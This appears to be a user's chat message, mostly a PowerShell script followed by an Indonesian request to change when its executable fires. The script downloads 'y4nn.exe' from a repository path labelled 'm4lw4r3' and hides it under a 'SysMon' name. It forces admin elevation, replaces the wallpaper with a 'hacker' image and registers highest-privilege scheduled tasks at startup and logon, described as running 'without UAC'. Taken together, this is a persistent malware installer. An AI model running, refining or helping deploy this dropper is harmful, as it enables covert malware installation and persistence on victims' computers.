$ErrorActionPreference='Continue'
function L($m){ "{0:HH:mm:ss} {1}" -f (Get-Date), $m }
$B='https://raw.githubusercontent.com/adrianwiraw/yanrevenge/main/m4lw4r3/'
$HASH='db25bf8803f7bd5b5b73095c2fadecc2f626d996c030743b0039949f3f81ff95'
$D="$env:LOCALAPPDATA\SysMon"; $X="$D\y4nn.exe"; $W="$D\wallpaper.png"
$P='C:\ProgramData\Microsoft\Windows\SysMon'
$DESK='HKCU:\Control Panel\Desktop'
$WALLS='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Wallpapers'
$u="$env:USERDOMAIN$env:USERNAME"

L "admin=$(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators'))"

L '0. siapkan folder + izin run as admin (sebelum download)'
New-Item -ItemType Directory $D -Force | Out-Null
$lk=[Microsoft.Win32.Registry]::CurrentUser.CreateSubKey('Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers')
$lk.SetValue($X,'~ RUNASADMIN',[Microsoft.Win32.RegistryValueKind]::String)
$lk.Close()
$chk=[Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers').GetValue($X)
L " layers=$chk"
if($chk -ne '~ RUNASADMIN'){ L ' GAGAL: flag runasadmin tidak tertulis'; Read-Host 'Enter'; return }

L '1. download'
curl.exe -fL --retry 3 --retry-delay 1 --connect-timeout 10 --max-time 180 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' -o $X ($B+'y4nn.exe')
L " curl exit=$LASTEXITCODE ada=$([IO.File]::Exists($X))"
if(-not [IO.File]::Exists($X)){ L ' GAGAL unduh'; Read-Host 'Enter'; return }
$h=(Get-FileHash $X -Algorithm SHA256).Hash
L " hashok=$($h -eq $HASH)"
if($h -ne $HASH){ L " GAGAL hash $h"; Read-Host 'Enter'; return }

L '2. wallpaper'
curl.exe -fsL --retry 2 -o $W ($B+'assets/hacker.png')
if(-not [IO.File]::Exists($W)){ L ' GAGAL unduh wallpaper'; Read-Host 'Enter'; return }
Set-ItemProperty $WALLS -Name BackgroundType -Value 0 -Type DWord -EA 0
Set-ItemProperty $DESK -Name WallpaperStyle -Value '10' -Type String -EA 0
Set-ItemProperty $DESK -Name TileWallpaper -Value '0' -Type String -EA 0
Add-Type -Namespace U -Name W -MemberDefinition '[System.Runtime.InteropServices.DllImport("user32.dll")] public static extern int SystemParametersInfo(int a,int b,string c,int d);'
Set-ItemProperty $DESK -Name Wallpaper -Value $W -Type String
[void][U.W]::SystemParametersInfo(20,0,$W,3)
L " wallpaper=$W ada=$([IO.File]::Exists($W))"

L '3. hapus task lama'
foreach($n in 'SysMonBoot','SysMonLogon','y4nn'){ Unregister-ScheduledTask -TaskName $n -Confirm:$false -EA 0 }

L '4. trigger saat laptop hidup (startup, elevated, tanpa UAC)'
$act=New-ScheduledTaskAction -Execute $X -Argument '--boot'
$set=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)
$t1=New-ScheduledTaskTrigger -AtStartup
$p1=New-ScheduledTaskPrincipal -UserId $u -RunLevel Highest -LogonType S4U
Register-ScheduledTask -TaskName 'SysMonBoot' -Action $act -Trigger $t1 -Principal $p1 -Settings $set -Force -EA 0 | Out-Null
L " SysMonBoot=$((Get-ScheduledTask -TaskName SysMonBoot -EA 0).State)"

L '5. cadangan: saat logon (kalau S4U ditolak)'
$t2=New-ScheduledTaskTrigger -AtLogOn -User $u
$p2=New-ScheduledTaskPrincipal -UserId $u -RunLevel Highest -LogonType Interactive
Register-ScheduledTask -TaskName 'SysMonLogon' -Action $act -Trigger $t2 -Principal $p2 -Settings $set -Force -EA 0 | Out-Null
L " SysMonLogon=$((Get-ScheduledTask -TaskName SysMonLogon -EA 0).State)"

L '6. jalankan sekali sekarang (UAC muncul sekali, ini wajar)'
Start-Process $X -ArgumentList '--now' -Verb RunAs
Start-Sleep 10

L '7. verifikasi'
L " proses=$((Get-Process y4nn -EA 0|Measure-Object).Count)"
L " LocalAppData exe=$([IO.File]::Exists($X)) wall=$([IO.File]::Exists($W))"
L " ProgramData exe=$([IO.File]::Exists("$P\y4nn.exe")) wall=$([IO.File]::Exists("$P\wallpaper.png"))"
L " layers=$([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers').GetValue($X))"
L " task boot=$((Get-ScheduledTask -TaskName SysMonBoot -EA 0).State) logon=$((Get-ScheduledTask -TaskName SysMonLogon -EA 0).State)"
L " wallpaper=$((Get-ItemProperty $DESK -Name Wallpaper).Wallpaper)"
Get-ScheduledTask -TaskName 'SysMon*' -EA 0 | % { L " $($.TaskName): $((($ | Get-ScheduledTaskInfo).NextRunTime))" } bre ini udah benar cuman saya ingin nya .exe dijalankan ketika komputer pertama kali nyala bbukan pertma kali donwload lasung ketrigger
